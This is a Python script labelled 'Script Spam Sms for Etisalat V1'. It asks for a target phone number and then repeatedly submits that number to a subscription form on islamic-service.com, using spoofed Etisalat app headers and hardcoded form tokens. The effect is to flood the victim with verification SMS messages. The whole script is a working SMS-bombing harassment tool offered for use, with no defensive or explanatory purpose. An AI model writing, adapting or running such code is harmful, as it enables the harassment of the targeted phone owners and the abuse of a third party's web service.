import requests 
import requests,random 
import sys,time,pyfiglet ,os
#print ('\033[;093m')
time.sleep (1)
'''x=input ('\033[;093m》Enter Password  : \033[;096m')	
print ()
if x == 'A' :
    time.sleep (1)
    print ('》True password')
    print ('\033[;092m')

else :
    print ('\033[;091mError Password Try again')
    exit()'''
print ('\033[;096m')
#time.sleep (2)
poli=pyfiglet.figlet_format ('SPAM ETISA')
print (poli)
c=('\033[;092m×××××××××××××××××××××××××××××××××××××××')
for I in c+'\n':
	sys.stdout.write (I)
	sys.stdout.flush ()
	time.sleep (00.050)
print ()
d =('\033[;092m##### Welcome To Abdullah Script #####')
for I in d +'\n':
	sys.stdout.write (I)
	sys.stdout.flush ()
	time.sleep (00.050)
print ()
c='#### Script Spam Sms for Etisalat V1###'
for I in c+'\n':
    sys.stdout.write(I) 
    sys.stdout.flush ()
    time.sleep (00.050)
print ()
c='### Projected By Abdullah  Salah ###'
for I in c+'\n':
    sys.stdout.write(I) 
    sys.stdout.flush ()
    time.sleep (00.050)
print ()


i='''\033[;092m Telegram channel : 

  ◇ http://t.me/Techno0099
          
Youttube channel  : 

 ◇ https://youtube.com/channel/UCAbtkFAe9yyX0HJNFXyKJUg '''
for I in i +'\n':
	sys.stdout.write (I)
	sys.stdout.flush ()
	time.sleep (00.050)
print ()

num=input ('》Enter Phone Number  :  ')
if len(num) !=11:
    print ('\033[;091mError Number')
elif num==str:
        print ('\033[;091mError Number')
    
else :
    print ()
    #number_of_messeges=(int(input ('》Enter Number Of Messages  :  ')))
#else:
#    print ('\033[;091mError Password')
    number_of_messegesx=0
    while number_of_messegesx<5:   

        url='http://islamic-service.com/enterphone.aspx'
        headers={
'Host': 'islamic-service.com',
'Connection': 'keep-alive',
'Content-Length': '481',
'Cache-Control': 'max-age=0',

'Upgrade-Insecure-Requests': '1',

'Origin': 'http://islamic-service.com',
'Content-Type': 'application/x-www-form-urlencoded',

'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SM-A225F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',

'X-Requested-With': 'com.etisalat',
'Referer': 'http://islamic-service.com/enterphone.aspx',

'Accept-Encoding': 'gzip, deflate',

'Accept-Language': 'ar,ar-EG;q=0.9,ar-AE;q=0.8,en-GB;q=0.7,en-US;q=0.6,en;q=0.5',

'Cookie': '_ga=GA1.2.951673252.1647781812; _gid=GA1.2.1192415705.1647781812; _gat_gtag_UA_148612129_4=1'
}

#m=input (' ENTER PHONE NUMBER  :  ')

        data={
'__VIEWSTATE':'XS+GuxTN3Kh3D/9wrWn9smOM7Dd90LdjX7vyj+o9Uh1SzL1HI1qE94bbbI3TYM6waElYx3pAjLbDxdmAR8iSLimcSH0ZYwfmS76j6Slv8SA=',

'__VIEWSTATEGENERATOR':'59F05AA2',

'__EVENTVALIDATION':'QMCuj3RvgfPr/ZfX6r6aziujX5KJtI5uZ3CTWgW/mKAq8+BQ+dpyy2yYghYcO+/FCWs8BmEFqr0DExJLTp/Qak3xoo2Qn+x7ihw4kJKfN3OBdOdOupBlYYQKtt2yNthuXYgeuqjCGd2OzgzyCV9avg==',

'ctl00$ContentPlaceHolder1$phone':num,

'ctl00$ContentPlaceHolder1$Button1':'إشترك+الآن'
}

        requests.post(url,headers=headers,data=data)
        number_of_messegesx =number_of_messegesx+1
#h='سيصلك كود قصير على الموبايل الآن عن طريق ال SMS قم بإدخاله هنا'
        if True:
            time.sleep (1)
            print (f'\033[;096mDone Send {number_of_messegesx} SMS')

        else:
            print ('\033[;091mSomthing wrong')